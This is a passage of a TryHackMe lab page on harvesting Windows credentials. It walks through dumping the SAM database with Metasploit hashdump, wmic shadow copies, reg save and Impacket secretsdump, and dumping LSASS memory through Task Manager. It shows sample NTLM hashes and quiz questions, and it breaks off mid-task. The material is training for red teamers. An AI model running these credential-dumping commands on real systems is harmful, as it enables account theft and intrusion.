data-pf_style_visibility="visible">Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The following are some of the Active Directory misconfigurations that may leak users' credentials<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span></p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Users' description</b>: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access.&nbsp;</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Group Policy SYSVOL</b>: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for more information about the vulnerable version of SYSVOL.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">NTDS: </b>Contains AD users' credentials, making it a target for attackers.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">AD Attacks: </b>Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Network Sniffing</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Gaining initial access to a target network enables attackers to perform various network attacks against local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                What is the value of the "flag" keyword in the Window registry?
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="3" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Enumerate the AD environment we provided. What is the password of the victim user&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">found in&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">the description section?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***********" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="3" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 4                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Local Windows Credentials
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory. This task discusses credentials for local user accounts and demonstrates how they can be obtained.</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Keystrokes</span></p>

<p data-pf_style_display="block" data-pf_style_visibility="visible">Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. However, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can perform keylogging using tools like the Metasploit framework or others.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">We have a use case example for exploiting users via keystrokes using Metasploit in another THM room. For more information, you should check THM <a href="https://tryhackme.com/room/exploitingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Exploiting AD</a> (Task 5).&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Security Account Manager (SAM)</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">However, there are various ways and attacks to dump the content of the SAM database.&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">First, ensure you have deployed the provided VM and then confirm we are not able to copy or read&nbsp; the&nbsp;</span><code data-pf_style_display="inline-block" data-pf_style_visibility="visible">c:\Windows\System32\config\sam</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;file:</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible"> <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible"> <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible"> Confirming No Access to the SAM Database </div> <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible"> <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Windows\system32&gt;type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32&gt; copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.</span></code> 
</pre> </div> </div>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Metasploit's HashDump</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the <a href="https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">rapid7 </a>blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!</p>

<p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Dumping the SAM database content
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">meterpreter &gt; getuid
Server username: THM\Administrator
meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
</span><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token path" data-pf_style_display="inline" data-pf_style_visibility="visible">CREDS-HARVESTIN</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">$</span><span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::</span></span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Volume Shadow Copy Service</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the&nbsp;</span><a target="_blank" href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service" class="editor-rtfLink" data-pf_style_display="inline" data-pf_style_visibility="visible">Microsoft documentation page</a><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;for more information about the service.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with <b data-pf_style_display="inline" data-pf_style_visibility="visible">administrator privileges </b>as follows,</span></p><ol data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">Run the standard cmd.exe prompt with administrator privileges.</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">Execute the wmic command to create a copy shadow of C: drive</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">Verify the creation from step 2 is available.</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt" data-pf_style_display="inline" data-pf_style_visibility="visible">Copy the SAM database from the volume we created in step 2</span></li></ol><p data-pf_style_display="block" data-pf_style_visibility="visible">Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Creating a Shadow Copy of Volume C with WMIC</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Users\Administrator&gt;wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)-&gt;create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Once the command is successfully executed, let's use the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">vssadmin</code>,&nbsp;Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:</code> volume.&nbsp;</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">Listing the Available Shadow Volumes</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Users\Administrator&gt;vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">The output shows that we have successfully created a shadow copy volume of (C:) with the following path: <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code>.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">As mentioned previously, the SAM database is encrypted either with <a href="https://en.wikipedia.org/wiki/RC4" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">RC4 </a>or <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">AES </a>encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">c:\Windows\System32\Config\system</code>.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,</p>

<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Copying the SAM and SYSTEM file from the Shadow Volume</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Users\Administrator&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="color:rgb(0, 0, 0);caret-color:rgb(0, 0, 0);font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Registry Hives</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">

</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Save SAM and SYSTEM files from the registry</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Users\Administrator\Desktop&gt;reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop&gt;reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop&gt;</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>

Let's this time decrypt it using one of the Impacket tools:&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">secretsdump.py</code>, which is already installed in the AttackBox. The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques. <p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Move both SAM and system files to the AttackBox and run the following command:</p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Decrypting SAM Database using Impacket SecretsDump Script Locally</div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token info punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token user" data-pf_style_display="inline" data-pf_style_visibility="visible">user@machine</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">:</span><span class="token path" data-pf_style_display="inline" data-pf_style_visibility="visible">~</span></span><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span> <span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL</span></span>
<span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...</span></code>
        </pre>
    </div>
</div><p data-pf_style_display="block" data-pf_style_visibility="visible"></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Note that we used the SAM and System files that we extracted from Windows Registry. The <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-sam</code> argument is to specify the path for the dumped sam file from the Windows machine. The <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">-system</code> argument is for a path for the system file. We used the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">LOCAL</code> argument at the end of the command to decrypt the Local SAM file as this tool handles other types of decryption.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Note if we compare the output against the NTLM hashes we got from Metasploit's Hashdump, the result is different. The reason is the other accounts belong to Active Directory, and their information is <b data-pf_style_display="inline" data-pf_style_visibility="visible">not </b>stored in the System file we have dumped. To Decrypt them, we need to dump the SECURITY file from the Windows file, which contains the required files to decrypt Active Directory accounts.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use different techniques to impersonate users using the hashes.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********************************" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="4" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 5                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Local Security Authority Subsystem Service (LSASS).
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">What is the LSASS?</span></p>

<p data-pf_style_display="block" data-pf_style_visibility="visible">Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources,&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">such as file shares, SharePoint sites, and other network services,</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;without entering credentials every time a user connects.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. Luckily for us, if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">the MITRE</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;ATT&amp;CK framework</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;as "</span><a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">OS Credential Dumping: LSASS Memory (T1003)</a><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">"</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Graphic User Interface (GUI)</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".</p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Credentials Harvesting_files/1af2123f694b7386364b53ae6259b8de.png" alt="Dumping lsass.exe process Using Task Manager" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="720" data-pf_rect_height="578" class="pf-large-image"></p><p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible">Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline. </p><p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible"><b data-pf_style_display="inline" 